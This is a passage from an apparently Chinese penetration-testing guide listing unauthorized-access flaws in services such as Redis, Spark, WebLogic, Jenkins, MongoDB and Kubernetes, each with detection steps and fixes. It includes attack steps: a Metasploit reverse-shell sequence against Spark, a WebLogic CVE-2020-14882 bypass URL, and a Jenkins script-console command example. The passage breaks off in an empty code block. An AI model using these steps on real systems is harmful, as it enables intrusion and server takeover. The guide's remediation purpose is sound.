是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p><p>在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。</p><h2 id="漏洞检测-8"><a href="#漏洞检测-8" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、未授权访问kali测试命令</p><p>curl 192.168.126.130:5984</p><p>curl 192.168.126.130:5984&#x2F;_config</p><h2 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>指定CouchDB绑定的IP （需要重启CouchDB才能生效）在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 文件中找到 “bind_address &#x3D; 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。 注：修改后只有本机才能访问CouchDB。</p><p>设置访问密码（需要重启CouchDB才能生效）在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 中找到“[admins]”字段配置密码。</p><p>设置WWW-Authenticate，强制认证。</p><h1 id="6066-x2F-8081-x2F-8082-Apache-Spark-未授权访问"><a href="#6066-x2F-8081-x2F-8082-Apache-Spark-未授权访问" class="headerlink" title="[6066&#x2F;8081&#x2F;8082] Apache Spark 未授权访问"></a>[6066&#x2F;8081&#x2F;8082] Apache Spark 未授权访问</h1><h2 id="漏洞简介-9"><a href="#漏洞简介-9" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。</p><h2 id="漏洞检测-9"><a href="#漏洞检测-9" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>nmap扫描出如下端口开放，则很有可能存在漏洞(6066,8081,8082)</p><p>使用msf工具getshell</p><p>msf5&gt;use exploit&#x2F;linux&#x2F;http&#x2F;spark_unauth_rce</p><p>msf5&gt;set payload java&#x2F;meterpreter&#x2F;reverse_tcp</p><p>msf5&gt;set rhost 192.168.100.2</p><p>msf5&gt;set rport 6066</p><p>msf5&gt;set lhost 192.168.100.1</p><p>msf5&gt;set lport 4444</p><p>msf5&gt;set srvhost 192.168.100.1</p><p>msf5&gt;set srvport 8080</p><p>msf5&gt;exploit</p><h2 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>对外关闭敏感端口；</li><li>配置用户权限认证；</li></ul><h1 id="6379-Redis-未授权访问"><a href="#6379-Redis-未授权访问" class="headerlink" title="[6379] Redis 未授权访问"></a>[6379] Redis 未授权访问</h1><h2 id="漏洞简介-10"><a href="#漏洞简介-10" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。</p><p>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p><h2 id="漏洞检测-10"><a href="#漏洞检测-10" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>端口扫描</p><p>Kali连接主机</p><p>（1）kali安装redis-cli远程连接工具</p><p>wget <a href="http://download.redis.io/redis-stable.tar.gz">http://download.redis.io/redis-stable.tar.gz</a></p><p>tar -zxvf redis-stable.tar.gz</p><p>cd redis-stable</p><p>make</p><p>cp src&#x2F;redis-cli &#x2F;usr&#x2F;bin&#x2F;</p><p>redis-cli -h</p><p>（2）使用redis-cli命令直接远程免密登录redis主机</p><p>redis-cli -h 目标主机IP</p><p>（3）尝试keys * 命令，若存在以下页面，则存在漏洞</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1671593077890-9fdec5e4-09fc-4819-9125-6214c162cfe0.jpeg" alt="img"></p><p>（4）进一步利用</p><p>利用redis 可视化工具Another Redis Desktop Manager</p><h2 id="漏洞修复-10"><a href="#漏洞修复-10" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>到redis安装目录下，配置redis.conf文件：</p><p>1、默认只对本地开放</p><p>bind 127.0.0.1</p><p>2、添加登陆密码</p><p>修改 redis.conf 文件，添加</p><p>requirepass  mypasswd</p><p>3、在需要对外开放的时候修改默认端口（端口不重复就可以）</p><p>port 2344</p><p>4、以低权限运行 Redis 服务（重启redis才能生效）</p><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p><p>5、最后还可以配合iptables限制开放</p><h1 id="7001-Weblogic-未授权访问"><a href="#7001-Weblogic-未授权访问" class="headerlink" title="[7001] Weblogic 未授权访问"></a>[7001] Weblogic 未授权访问</h1><h2 id="漏洞简介-11"><a href="#漏洞简介-11" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。</p><p>CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p><h2 id="漏洞检测-11"><a href="#漏洞检测-11" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、使用vulhub搭建漏洞演示环境</p><p>cd vulhub&#x2F;weblogic&#x2F;CVE-2020-14882</p><p>sudo docker-compose up –d</p><p>攻击者可以构造特殊请求的URL，即可未授权访问到管理后台页面：</p><p><a href="http://192.168.126.130:7001/console/css/%252e%252e%252fconsole.portal">http://192.168.126.130:7001/console/css/%252e%252e%252fconsole.portal</a></p><p>远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。</p><h2 id="漏洞修复-11"><a href="#漏洞修复-11" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>下载补丁程序并安装更新；</li></ul><h1 id="8088-HadoopYARN-未授权访问"><a href="#8088-HadoopYARN-未授权访问" class="headerlink" title="[8088] HadoopYARN 未授权访问"></a>[8088] HadoopYARN 未授权访问</h1><h2 id="漏洞简介-12"><a href="#漏洞简介-12" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。</p><p>此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。</p><h2 id="漏洞检测-12"><a href="#漏洞检测-12" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、使用vulhub搭建漏洞演示环境</p><p>1 cd &#x2F;vulhub&#x2F;hadoop&#x2F;unauthorized-yarn</p><p>2 docker-compose up -d</p><p>3、环境启动后，没有配置身份认证，可以未授权访问到Hadoop YARN ResourceManager WebUI页面。</p><p>1 <a href="http://192.168.126.130:8088/">http://192.168.126.130:8088/</a></p><p>2 <a href="http://192.168.126.130:8088/cluster">http://192.168.126.130:8088/cluster</a></p><p>利用该漏洞，可以进一步getshell</p><h2 id="漏洞修复-12"><a href="#漏洞修复-12" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>升级Hadoop到x版本以上，并启用Kerberos认证功能，禁止匿名访问;</li><li>设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口；</li><li>如无必要，关闭 Hadoop Web 管理页面；</li></ul><h1 id="8080-JBoss-未授权访问"><a href="#8080-JBoss-未授权访问" class="headerlink" title="[8080] JBoss 未授权访问"></a>[8080] JBoss 未授权访问</h1><h2 id="漏洞简介-13"><a href="#漏洞简介-13" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>漏洞简述JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 <a href="http://ip:8080/jmx-console%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%B5%8F%E8%A7%88">http://ip:8080/jmx-console，就可以浏览</a> Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患</p><h2 id="漏洞检测-13"><a href="#漏洞检测-13" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、直接访问 <a href="http://ip:port/，看是否能进入">http://ip:port/，看是否能进入</a> jmx-console 和 web-console 页面</p><p><a href="http://ip:8080/">http://ip:8080/</a></p><p><a href="http://ip:8080/jmx-console/">http://ip:8080/jmx-console/</a></p><p><a href="http://ip:8080/jbossws/">http://ip:8080/jbossws/</a></p><h2 id="漏洞修复-13"><a href="#漏洞修复-13" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>添加 JMX 控制页面身份认证；</li><li>进行JMX Console 安全配置；</li><li>关闭jmx-console和web-console;</li></ul><h1 id="8080-Jenkins-未授权访问"><a href="#8080-Jenkins-未授权访问" class="headerlink" title="[8080] Jenkins 未授权访问"></a>[8080] Jenkins 未授权访问</h1><h2 id="漏洞简介-14"><a href="#漏洞简介-14" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p><h2 id="漏洞检测-14"><a href="#漏洞检测-14" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、直接通过url输入以下地址，若能访问，证明存在未授权访问漏洞。</p><p>http:&#x2F;&#x2F;<target>:8080&#x2F;manage</p><p>http:&#x2F;&#x2F;<target>:8080&#x2F;script</p><p>未授权访问 http:&#x2F;&#x2F;<target>:8080&#x2F;script，可以执行系统命令</p><p># 命令格式</p><p>println ‘whoami’.execute().text</p><h2 id="漏洞修复-14"><a href="#漏洞修复-14" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>对后台控制页面做登录验证限制；</li><li>升级Jenkins至新版本；</li><li>禁止把Jenkins直接暴露在公网；</li></ul><h1 id="8080-x2F-10250-Kubernetes-Api-Server-未授权"><a href="#8080-x2F-10250-Kubernetes-Api-Server-未授权" class="headerlink" title="[8080&#x2F;10250] Kubernetes Api Server 未授权"></a>[8080&#x2F;10250] Kubernetes Api Server 未授权</h1><h2 id="漏洞简介-15"><a href="#漏洞简介-15" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。</p><h2 id="漏洞检测-15"><a href="#漏洞检测-15" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p><p>2、检测</p><p>（1）端口：8080 <a href="http://10.10.4.89:8080/">http://10.10.4.89:8080/</a></p><p>（2）端口：8080：api dashboard：<a href="http://10.10.4.89:8080/ui">http://10.10.4.89:8080/ui</a></p><p>（3）端口：10250端口是kubelet API的HTTPS端口，通过路径:<a href="https://xxx/10250/pods%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E3%80%81%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%E4%BF%A1%E6%81%AF%E3%80%81%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E7%AD%89%E4%BF%A1%E6%81%AF%E3%80%82">https://xxx/10250/pods获取环境变量、运行的容器信息、命名空间等信息。</a></p><h2 id="漏洞修复-15"><a href="#漏洞修复-15" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>进行授权认证；</li><li>使用Service Account令牌；</li><li>设置防火墙策略，限定IP访问服务；</li></ul><h1 id="8161-Active-MQ-未授权访问"><a href="#8161-Active-MQ-未授权访问" class="headerlink" title="[8161] Active MQ 未授权访问"></a>[8161] Active MQ 未授权访问</h1><h2 id="漏洞简介-16"><a href="#漏洞简介-16" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p><h2 id="漏洞检测-16"><a href="#漏洞检测-16" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>默认端口：8161</p><p>默认密码：admin&#x2F;admin</p><h2 id="漏洞修复-16"><a href="#漏洞修复-16" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>针对未授权访问，可修改conf&#x2F;jetty.xml文件，bean id为securityConstraint下的authenticate修改值为true，重启服务即可。</p><p>针对弱口令，可修改conf&#x2F;jetty.xml文件，bean id 为securityLoginService下的conf值获取用户properties，修改用户名密码，重启服务即可。</p><h1 id="8888-Jupyter-Notebook-未授权访问"><a href="#8888-Jupyter-Notebook-未授权访问" class="headerlink" title="[8888] Jupyter Notebook 未授权访问"></a>[8888] Jupyter Notebook 未授权访问</h1><h2 id="漏洞简介-17"><a href="#漏洞简介-17" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p><h2 id="漏洞检测-17"><a href="#漏洞检测-17" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、使用vulhub搭建漏洞演示环境</p><p>cd &#x2F;vulhub&#x2F;jupyter&#x2F;notebook-rce</p><p>docker-compose up -d</p><p>2、端口扫描</p><p>3、访问<a href="http://your-ip:8888，将看到Jupyter">http://your-ip:8888，将看到Jupyter</a> Notebook的Web管理界面，并没有要求填写密码。</p><p>选择 new -&gt; terminal 即可创建一个控制台：</p><p>直接执行任意命令：</p><h2 id="漏洞修复-17"><a href="#漏洞修复-17" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>开启身份验证，防止未经授权用户访问；</li><li>访问控制策略，限制IP访问，绑定固定IP；</li></ul><h1 id="9200-x2F-9300-Elasticsearch-未授权访问（9200、9300）"><a href="#9200-x2F-9300-Elasticsearch-未授权访问（9200、9300）" class="headerlink" title="[9200&#x2F;9300] Elasticsearch 未授权访问（9200、9300）"></a>[9200&#x2F;9300] Elasticsearch 未授权访问（9200、9300）</h1><h2 id="漏洞简介-18"><a href="#漏洞简介-18" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。</p><h2 id="漏洞检测-18"><a href="#漏洞检测-18" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、浏览器访问测试命令</p><p><a href="http://localhost:9200/">http://localhost:9200</a></p><p><a href="http://localhost:9200/_cat/">http://localhost:9200/_cat/</a></p><p><a href="http://localhost:9200/_cat/indices">http://localhost:9200/_cat/indices</a></p><p><a href="http://localhost:9200/_river/_search">http://localhost:9200/_river/_search</a> &#x2F;&#x2F;查看数据库敏感信息</p><p><a href="http://localhost:9200/_nodes">http://localhost:9200/_nodes</a>         &#x2F;&#x2F;查看节点数据</p><p>如有安装head插件：</p><p><a href="http://localhost:9200/_plugin/head/">http://localhost:9200/_plugin/head/</a>  &#x2F;&#x2F;web管理界面</p><h2 id="漏洞修复-18"><a href="#漏洞修复-18" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>访问控制策略，限制IP访问，绑定固定IP；</li><li>在config&#x2F;elasticsearch.yml中为9200端口设置认证等；</li></ul><h1 id="10051-Zabbix-未授权访问"><a href="#10051-Zabbix-未授权访问" class="headerlink" title="[10051] Zabbix 未授权访问"></a>[10051] Zabbix 未授权访问</h1><h2 id="漏洞简介-19"><a href="#漏洞简介-19" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p><h2 id="漏洞检测-19"><a href="#漏洞检测-19" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、无需账户密码直接访问zabbix页面</p><h2 id="漏洞修复-19"><a href="#漏洞修复-19" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>设置zabbix的复杂口令，不要用默认口令或弱口令，禁用guest登录功能；</li><li>zabbix的server和agent都不要以root启动，不要设置AllowRoot&#x3D;1；</li><li>禁止agent执行run，不要设置EnableRemoteCommands&#x3D;1；</li></ul><h1 id="11211-Memcached-未授权访问"><a href="#11211-Memcached-未授权访问" class="headerlink" title="[11211] Memcached 未授权访问"></a>[11211] Memcached 未授权访问</h1><h2 id="漏洞简介-20"><a href="#漏洞简介-20" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Memcached 端口对外开放并且没有配置认证选项，未授权用户可直接获取数据库中所有信息，造成严重的信息泄露。</p><h2 id="漏洞检测-20"><a href="#漏洞检测-20" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、无需用户名密码，可以直接连接memcache 服务的11211端口</p><p>telnet 10.10.4.89 11211</p><p># 或者</p><p>nc -vv 11211</p><p>使用了 stats 命令来输出 Memcached 服务信息</p><h2 id="漏洞修复-20"><a href="#漏洞修复-20" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>修改绑定的IP、端口和指定访问者IP；</li><li>设置防火墙策略；</li><li>禁止暴露在公网；</li><li>配置memcached监听本地回环地址</li><li>127.0.0.1；</li></ul><h1 id="15672-x2F-15692-x2F-25672-RabbitMQ-未授权访问"><a href="#15672-x2F-15692-x2F-25672-RabbitMQ-未授权访问" class="headerlink" title="[15672&#x2F;15692&#x2F;25672] RabbitMQ 未授权访问"></a>[15672&#x2F;15692&#x2F;25672] RabbitMQ 未授权访问</h1><h2 id="漏洞简介-21"><a href="#漏洞简介-21" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。</p><h2 id="漏洞检测-21"><a href="#漏洞检测-21" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、浏览器访问测试</p><p>默认账号密码都是guest</p><p><a href="http://10.10.4.89:15672/">http://10.10.4.89:15672</a></p><p><a href="http://10.10.4.89:15692/">http://10.10.4.89:15692</a></p><p><a href="http://10.10.4.89:25672/">http://10.10.4.89:25672</a></p><h2 id="漏洞修复-21"><a href="#漏洞修复-21" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>修改为强密码，删除默认的账号guest；</li><li>禁止对外网开放，仅限于内部访问；</li></ul><h1 id="27017-MongoDB-未授权访问"><a href="#27017-MongoDB-未授权访问" class="headerlink" title="[27017] MongoDB 未授权访问"></a>[27017] MongoDB 未授权访问</h1><h2 id="漏洞简介-22"><a href="#漏洞简介-22" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p><p>造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。</p><h2 id="漏洞检测-22"><a href="#漏洞检测-22" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、kali安装mongodb，然后直接连接到服务。</p><p>yum install mongodb</p><p>mongo –host 10.2.20.34 –port 27017</p><h2 id="漏洞修复-22"><a href="#漏洞修复-22" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>限制绑定IP，启动时加入参数–bind_ip 127.0.0.1或在&#x2F;etc&#x2F;mongodb.conf文件中添加以下内容：bind_ip &#x3D; 127.0.0.1；</li><li>在system.users中添加用户，启动认证；</li><li>设置防火墙策略，限定 IP 访问服务；</li><li>禁用HTTP和REST端口，修改配置文件或在启动的时候选择参数nohttpinterface&#x3D;false；</li></ul><h1 id="2049-x2F-20048-NFS-未授权访问"><a href="#2049-x2F-20048-NFS-未授权访问" class="headerlink" title="[2049&#x2F;20048] NFS 未授权访问"></a>[2049&#x2F;20048] NFS 未授权访问</h1><h2 id="漏洞简介-23"><a href="#漏洞简介-23" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Network File System(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏。</p><h2 id="漏洞检测-23"><a href="#漏洞检测-23" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、</p><p>#linux安装nfs客户端</p><p>apt install nfs-common</p><p>#查看nfs服务器上的共享目录</p><p>showmount -e 192.168.126.130</p><p>#挂载相应共享目录到本地</p><p>mount -t nfs 192.168.126.130:&#x2F;grdata &#x2F;mnt</p><p>#卸载目录</p><p>umount &#x2F;mnt</p><h2 id="漏洞修复-23"><a href="#漏洞修复-23" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>利用iptables限制端口2049和20048端口的访问，禁止外部访问；</li><li>设置&#x2F;etc&#x2F;exports，对访问进行控制；</li></ul><h1 id="28096-Dubbo-未授权访问"><a href="#28096-Dubbo-未授权访问" class="headerlink" title="[28096] Dubbo 未授权访问"></a>[28096] Dubbo 未授权访问</h1><h2 id="漏洞简介-24"><a href="#漏洞简介-24" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。</p><h2 id="漏洞检测-24"><a href="#漏洞检测-24" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、连接进入dubbo 服务，进行操作</p><p>telent IP port</p><h2 id="漏洞修复-24"><a href="#漏洞修复-24" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>配置dubbo认证；</li><li>设置防火墙策略，限定IP访问；</li></ul><h1 id="Druid-未授权访问"><a href="#Druid-未授权访问" class="headerlink" title="Druid 未授权访问"></a>Druid 未授权访问</h1><h2 id="漏洞简介-25"><a href="#漏洞简介-25" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问。</p><h2 id="漏洞检测-25"><a href="#漏洞检测-25" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>直接在网站的url中后加上：</p><p>1 &#x2F;druid&#x2F;index.html</p><p>2 &#x2F;druid&#x2F;websession.html</p><p>3 &#x2F;druid&#x2F;datasource.html</p><p>4 &#x2F;druid&#x2F;sql.html</p><p>5 &#x2F;druid&#x2F;spring.html</p><p>如果可以无需登录，即可登录到Druid监控界面，则说明该网站存在Druid未授权访问漏洞</p><h2 id="漏洞修复-25"><a href="#漏洞修复-25" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>配置访问账号密码；</li><li>禁止对外网开放访问；</li></ul><h1 id="Solr-未授权访问"><a href="#Solr-未授权访问" class="headerlink" title="Solr 未授权访问"></a>Solr 未授权访问</h1><h2 id="漏洞简介-26"><a href="#漏洞简介-26" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell。</p><h2 id="漏洞检测-26"><a href="#漏洞检测-26" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>敏感目录扫描时加上一条 &#x2F;solr&#x2F;admin</p><p><a href="http://xx.xx.com/solr/admin">http://xx.xx.com/solr/admin</a></p><p><a href="https://xx.xx.com/solr/admin">https://xx.xx.com/solr/admin</a></p><h2 id="漏洞修复-26"><a href="#漏洞修复-26" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>配置solr访问控制权限；</li><li>禁止将solr暴露在公网；</li></ul><h1 id="SpringBoot-Actuator-未授权访问"><a href="#SpringBoot-Actuator-未授权访问" class="headerlink" title="SpringBoot Actuator 未授权访问"></a>SpringBoot Actuator 未授权访问</h1><h2 id="漏洞简介-27"><a href="#漏洞简介-27" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。</p><h2 id="漏洞检测-27"><a href="#漏洞检测-27" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、直接访问相关路径：</p><p><a href="http://10.2.20.48/actuator/autoconfig">http://10.2.20.48/actuator/autoconfig</a></p><p><a href="http://10.2.20.48/env">http://10.2.20.48 /actuator/env</a></p><p><a href="http://10.2.20.48/actuator/dump">http://10.2.20.48/actuator/dump</a></p><p><a href="http://10.2.20.48/actuator/headdump%E5%8F%AF%E4%B8%8B%E8%BD%BD">http://10.2.20.48/actuator/headdump可下载</a></p><p>2、actuator未直接部署在IP根目录下</p><p>使用burpsuite的插件：APIKit</p><p>介绍：<a href="https://www.bilibili.com/read/cv15912732">https://www.bilibili.com/read/cv15912732</a></p><p>介绍：<a href="https://blog.csdn.net/qq_50854790/article/details/122894291">https://blog.csdn.net/qq_50854790/article/details/122894291</a></p><h2 id="漏洞修复-27"><a href="#漏洞修复-27" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>禁用&#x2F;env接口；</li><li>升级到SpringBoot Actuator 2.0；</li><li>禁止对外开放；</li></ul><h1 id="SwaggerUI未授权访问漏洞"><a href="#SwaggerUI未授权访问漏洞" class="headerlink" title="SwaggerUI未授权访问漏洞"></a>SwaggerUI未授权访问漏洞</h1><h2 id="漏洞简介-28"><a href="#漏洞简介-28" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。</p><h2 id="漏洞检测-28"><a href="#漏洞检测-28" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、可利用未授权访问漏洞，直接访问以下链接（目录遍历）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 